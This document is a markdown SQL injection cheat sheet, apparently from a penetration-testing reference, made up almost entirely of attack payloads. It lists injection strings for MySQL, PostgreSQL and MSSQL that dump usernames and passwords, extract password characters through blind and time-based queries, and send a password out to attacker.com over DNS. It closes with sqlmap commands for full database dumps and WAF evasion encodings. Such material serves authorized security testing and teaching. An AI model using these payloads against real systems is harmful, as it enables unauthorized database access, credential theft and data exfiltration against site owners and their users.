---
title: SQL Injection
excerpt: Union-based, blind, time-based and OOB SQLi — detection, exploitation, and automation with sqlmap.
---

# SQL Injection

## Detection

```sql
-- Single quote error test
'
''
`
-- Boolean tests
' AND 1=1 --
' AND 1=2 --
-- Time-based
'; WAITFOR DELAY '0:0:5' --   (MSSQL)
' AND SLEEP(5) --              (MySQL)
' AND 1=(SELECT 1 FROM pg_sleep(5)) --  (PostgreSQL)
```

---

## Error-based / Union

```sql
-- Find column count
' ORDER BY 1 --
' ORDER BY 2 --
...until error

-- Union injection
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1, user(), database() --

-- Extract tables (MySQL)
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() --

-- Extract columns
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --

-- Dump data
' UNION SELECT username,password,3 FROM users --
```

---

## Blind (Boolean-based)

```sql
-- Determine DB version length
' AND LENGTH(version())=8 --

-- Extract char by char
' AND SUBSTR(version(),1,1)='8' --
' AND ASCII(SUBSTR(password,1,1))>100 --
```

---

## Time-based blind

```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0) --
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- MSSQL
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5' --
```

---

## Out-of-band (OOB)

```sql
-- MySQL: DNS exfil via LOAD_FILE (requires file_priv)
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))

-- MSSQL: DNS via linked server
EXEC master..xp_dirtree '\\attacker.com\share'
```

---

## sqlmap quick reference

```bash
# Basic detection
sqlmap -u "http://target/page?id=1" --batch

# Full dump
sqlmap -u "http://target/page?id=1" --batch --dump-all

# With cookies (authenticated)
sqlmap -u "http://target/page?id=1" --cookie "session=abc123" --batch

# POST request
sqlmap -u "http://target/login" --data "user=admin&pass=test" --batch

# Level and risk (higher = more aggressive)
sqlmap -u "..." --level=5 --risk=3

# Second-order SQLi
sqlmap -u "http://target/profile" --second-url "http://target/display" --batch
```

---

## WAF bypass techniques

| Technique | Example |
|---|---|
| Case variation | `SeLeCt`, `uNiOn` |
| Comments | `SE/**/LECT`, `UN--\nION` |
| URL encoding | `%55NION` (U→%55) |
| Double encoding | `%2555NION` |
| Whitespace alternatives | `SELECT%09`, `SELECT%0a` |
| Inline comment | `/*!UNION*/` (MySQL) |
